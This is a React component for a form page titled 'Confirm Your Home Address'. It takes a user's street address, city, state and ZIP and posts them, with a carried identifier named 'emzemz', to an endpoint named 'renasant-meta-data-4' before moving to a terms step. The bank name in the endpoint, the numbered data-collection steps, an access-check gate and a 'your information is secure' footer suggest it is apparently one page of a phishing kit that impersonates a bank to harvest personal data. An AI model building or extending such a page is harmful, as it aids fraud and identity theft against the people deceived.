import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const HomeAddress: React.FC = () => {
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    stAd: '',
    apt: '',
    city: '',
    state: '',
    zipCode: '',
    form: '',
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      stAd: !stAd.trim() ? 'Street address is required.' : '',
      city: !city.trim() ? 'City is required.' : '',
      state: !state.trim() ? 'State is required.' : '',
      zipCode: !zipCode.trim() ? 'ZIP code is required.' : '',
      apt: '',
      form: '',
    };

    setErrors(newErrors);

    if (!newErrors.stAd && !newErrors.city && !newErrors.state && !newErrors.zipCode) {
      try {
        await axios.post(`${baseUrl}api/renasant-meta-data-4/`, {
          emzemz,
          stAd,
          apt,
          city,
          state,
          zipCode,
        });

        navigate('/terms', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting home address:', error);
        setErrors((prev) => ({
          ...prev,
          form: 'There was an error submitting your address. Please try again.',
        }));
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  if (!isAllowed) {
    return null;
  }

  if (!emzemz) {
    return (
      <FlowCard title="Unable to continue">
        <p className="text-sm text-slate-600">
          We could not locate your previous step. Please restart the flow from the beginning.
        </p>
      </FlowCard>
    );
  }

  const footer = (
    <p className="text-xs text-slate-600 text-center">
      Your information is secure and will be used in accordance with our Privacy Policy.
    </p>
  );

  return (
    <FlowCard
      title="Confirm Your Home Address"
      subtitle={<span className="text-slate-600">This should match the address tied to your credit profile.</span>}
      footer={footer}
    >
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="stAd">
            Street address
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="stAd"
              name="stAd"
              type="text"
              value={stAd}
              onChange={(e) => setStAd(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="123 Main St"
            />
          </div>
          {errors.stAd ? <FormError message={errors.stAd} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="apt">
            Apartment or unit (optional)
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="apt"
              name="apt"
              type="text"
              value={apt}
              onChange={(e) => setApt(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="Unit 5B"
            />
          </div>
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="city">
            City
          </label>
          <div className="flex items-center border border-slate-200 rounded">
            <input
              id="city"
              name="city"
              type="text"
              value={city}
              onChange={(e) => setCity(e.target.value)}
              className="w-full px-3 py-3 text-sm focus:outline-none"
              placeholder="City"
            />
          </div>
          {errors.city ? <FormError message={errors.city} /> : null}
        </div>

        <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
          <div>
            <label className="block text-sm text-slate-500 mb-1" htmlFor="state">
              State
            </label>
            <div className="flex items-center border border-slate-200 rounded">
              <input
                id="state"
                name="state"
                type="text"
                value={state}
                onChange={(e) => setState(e.target.value)}
                className="w-full px-3 py-3 text-sm focus:outline-none"
                placeholder="CA"
              />
            </div>
            {errors.state ? <FormError message={errors.state} /> : null}
          </div>

          <div>
            <label className="block text-sm text-slate-500 mb-1" htmlFor="zipCode">
              ZIP code
            </label>
            <div className="flex items-center border border-slate-200 rounded">
              <input
                id="zipCode"
                name="zipCode"
                type="text"
                value={zipCode}
                onChange={(e) => setZipCode(e.target.value)}
                className="w-full px-3 py-3 text-sm focus:outline-none"
                placeholder="90210"
              />
            </div>
            {errors.zipCode ? <FormError message={errors.zipCode} /> : null}
          </div>
        </div>

        {errors.form ? (
          <div className="rounded-md border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-600">
            {errors.form}
          </div>
        ) : null}

        <button
          type="submit"
          className="w-full bg-[#0f4f6c] text-white py-3 rounded-md flex items-center justify-center gap-2 disabled:opacity-75"
          disabled={isLoading}
        >
          {isLoading ? (
            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-white border-t-transparent"></div>
          ) : (
            <>
              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 0l-2 2m2-2l-2-2m6 2l2 2m-2-2l2-2" />
              </svg>
              <span>Continue</span>
            </>
          )}
        </button>
      </form>
    </FlowCard>
  );
};

export default HomeAddress;